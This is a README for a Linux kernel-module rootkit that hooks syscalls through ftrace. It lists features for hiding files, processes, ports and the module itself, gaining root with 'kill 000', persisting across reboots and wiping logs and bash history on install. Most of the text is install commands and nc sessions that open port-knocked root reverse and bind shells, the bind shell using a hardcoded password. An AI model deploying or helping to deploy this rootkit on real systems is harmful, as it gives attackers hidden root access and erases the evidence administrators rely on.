==============================BDS LKM FTRACE ROOTKIT

Linux Loadable Kernel Module Rootkit for Linux Kernel 5.x and 6.x on x86_64 using ftrace to hook syscall

Developed by : Antonius
Website : www.bluedragonsec.com
Github : https://github.com/bluedragonsecurity
Twitter : https://twitter.com/bluedragonsec

This lkm rootkit works on x64 architecture only.

Features :
- hide files and directories with prefix bds_
- port knocking bind shell (bind shell password is : bluedragonsec)
- port knocking reverse shell
- privilege escalation using kill 000 command
- hide bind shell and reverse shell port from netstat
- hide bind shell and reverse shell process
- rootkit persistence to survive after reboot
- hide module
- clean logs and bash history during installation


=====INSTALLATION=====

In case you have installed linux kernel headers, make and gcc, install it by running the installer script:

./install.sh direct

In case you have not installed linux kernel headers, make and gcc, install it by running the installer script :

./install.sh


=====USING THE ROOTKIT=====

==Privilege Escalation

Once the rootkit installed on the system, in case you lost root privilege, you can regain root privilege by typing : kill 000
____________________________________________________________________

robotsoft@robotsoft:~$ id
uid=1000(robotsoft) gid=1000(robotsoft) groups=1000(robotsoft),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare)
robotsoft@robotsoft:~$ kill 000
robotsoft@robotsoft:~$ id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare),1000(robotsoft)
___________________________________________________________________

==Activating Reverse Shell

To activate reverse shell, you need to set up a port listener using netcat on port 31337, then do port knocking to your target server (with rootkit installed) on port 1337.
On your machine, open terminal and type:
__________________

nc -l -p 31337 -v
__________________

Open another terminal tab and do port knocking to target server :

____________________

nc server ip 1337
____________________

Wait a few seconds and you will get reverse shell port connection from your target server.

Example (server ip address with rootkit installed is at 192.168.0.102):

____________________________________________

  robotsoft@robotsoft:~$ nc -l -p 31337 -v
  Listening on 0.0.0.0 31337
_____________________________________________


Do port knocking to target ip address (with rootkit installed) :

___________________________________________________

robotsoft@robotsoft:~$ nc 192.168.0.102 1337
___________________________________________________

Back on your previous netcat listener, you will receive a reverse shell connection :

__________________________________________________

robotsoft@robotsoft:~$ nc -l -p 31337 -v
Listening on 0.0.0.0 31337
Connection received on 192.168.0.102 44052
Linux robotsoft 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
__________________________________________________


== Activating Bind Shell

To activate bind shell, you need to do port knocking to your target server (with rootkit installed) on port 1338. The bind shell password is : bluedragonsec
On your machine, open terminal and type:

_________________________________

nc server ip 1338
Wait a few seconds then type:
nc server ip 31337
type the password : bluedragonsec
__________________________________

Example (server ip address with rootkit installed is at 192.168.0.102):

_________________________________________________________

robotsoft@robotsoft:~$ nc 192.168.0.102 1338
(wait a few seconds)
robotsoft@robotsoft:~$ nc 192.168.0.102 31337
Password :bluedragonsec
Linux robotsoft 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
__________________________________________________________


==Hiding Files and Directories

To hide file and directory just give prefix bds_ to file name and directory name

==How to Clean Logs and Bash History ?
Before running installation script, add username to clean logs to usernames_to_clear_logs.txt in new line, example:
_________
root
robotsoft
_________

User logs will be cleaned during rootkit installation


==Persistence

The rootkit is activated every time the system starts up. After the reboot, wait for 1 minute, the rootkit will be loaded into kernel.
    
